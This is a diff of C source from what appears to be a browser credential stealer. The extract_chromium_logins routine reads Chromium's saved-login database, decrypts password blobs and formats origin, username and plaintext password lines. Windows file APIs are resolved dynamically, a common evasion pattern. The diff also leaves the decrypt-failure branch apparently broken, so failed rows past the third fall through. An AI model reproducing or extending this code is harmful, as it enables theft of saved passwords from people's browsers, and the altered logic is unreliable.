@@ -810,19 +810,6 @@ static int dir_exists(const char *path) {
 #endif
 }
 
-/* ── Helper: check if file exists ────────────────────────────── */
-
-static int file_exists(const char *path) {
-#ifdef _WIN32
-    if (!chrome_misc_ensure()) return 0;
-    DWORD attr = g_chrome_misc.pGFAA(path);
-    return (attr != INVALID_FILE_ATTRIBUTES &&
-            !(attr & FILE_ATTRIBUTE_DIRECTORY));
-#else
-    struct stat st;
-    return (stat(path, &st) == 0 && S_ISREG(st.st_mode));
-#endif
-}
 
 /* ── Helper: extract basename from path ──────────────────────── */
 
@@ -1108,7 +1095,7 @@ char **extract_chromium_logins(const char *profile_path,
     *count = 0;
 
     unsigned char dec_buf[8192];
-    int decrypt_ok = 0, decrypt_fail = 0, not_blob = 0, short_row = 0;
+    int short_row = 0;
 
     for (size_t r = 0; r < row_count; r++) {
         SqliteRow *row = &rows[r];
@@ -1133,7 +1120,6 @@ char **extract_chromium_logins(const char *profile_path,
 
         /* Decrypt password blob */
         if (row->values[idx_pass].type != SQLITE_VAL_BLOB) {
-            not_blob++;
             continue;
         }
         const unsigned char *enc = row->values[idx_pass].as.blob.ptr;
@@ -1142,11 +1128,9 @@ char **extract_chromium_logins(const char *profile_path,
         size_t dec_len = 0;
         if (chrome_decrypt_password(enc, enc_len, key,
                                     dec_buf, sizeof(dec_buf), &dec_len) != 0) {
-            decrypt_fail++;
-            if (r < 3) 
+            if (r < 3)
             continue;
         }
-        decrypt_ok++;
 
         /* Format: "origin\tusername\tpassword\n" */
         size_t line_len = origin_len + 1 + user_len + 1 + dec_len + 1;
